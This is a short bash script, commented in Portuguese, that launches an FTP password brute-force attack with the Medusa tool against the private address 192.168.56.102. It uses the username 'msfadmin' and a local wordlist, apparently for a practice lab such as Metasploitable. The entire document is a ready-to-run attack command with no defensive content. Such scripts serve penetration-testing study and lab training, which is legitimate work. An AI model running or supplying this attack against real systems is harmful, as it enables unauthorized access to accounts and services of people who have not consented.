#!/bin/bash
# Ataque de força bruta em FTP com Medusa

TARGET="192.168.56.102"
USERNAME="msfadmin"
WORDLIST="../wordlists/ftp.txt"

echo "[*] Iniciando ataque FTP contra $TARGET com usuário $USERNAME..."
medusa -h $TARGET -u $USERNAME -P $WORDLIST -M ftp
